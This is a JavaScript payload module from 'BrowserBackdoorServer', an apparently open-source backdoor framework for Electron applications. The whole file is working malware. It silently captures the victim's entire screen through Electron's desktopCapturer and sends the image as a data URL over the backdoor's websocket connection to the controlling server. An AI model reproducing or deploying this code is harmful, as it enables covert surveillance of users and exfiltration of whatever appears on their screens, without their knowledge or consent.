/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Takes a screenshot of the main screen.
 * Parameters: None
 * Returns: undefined, Data URL of screenshot
 * Author: IMcPwn
 */

if (typeof electron === typeof undefined) electron = require('electron');
if (typeof desktopCapturer === typeof undefined) desktopCapturer = electron.desktopCapturer;
if (typeof electronScreen === typeof undefined) electronScreen = electron.screen;
if (typeof shell === typeof undefined) shell = electron.shell;

if (typeof fs === typeof undefined) fs = require('fs');
if (typeof os === typeof undefined) os = require('os');
if (typeof path === typeof undefined) path = require('path');

if (typeof thumbSize === typeof undefined) thumbSize = determineScreenShotSize();
if (typeof options === typeof undefined) options = { types: ['screen'], thumbnailSize: thumbSize };

desktopCapturer.getSources(options, function (error, sources) {
    if (error) ws.send(error)

    sources.forEach(function (source) {
        if (source.name === 'Entire screen' || source.name === 'Screen 1') {
            ws.send("Screenshot data URL: " + source.thumbnail.toDataURL())
        }
    })
})

function determineScreenShotSize() {
  screenSize = electronScreen.getPrimaryDisplay().workAreaSize
  maxDimension = Math.max(screenSize.width, screenSize.height)
  return {
    width: maxDimension * window.devicePixelRatio,
    height: maxDimension * window.devicePixelRatio
  }
}
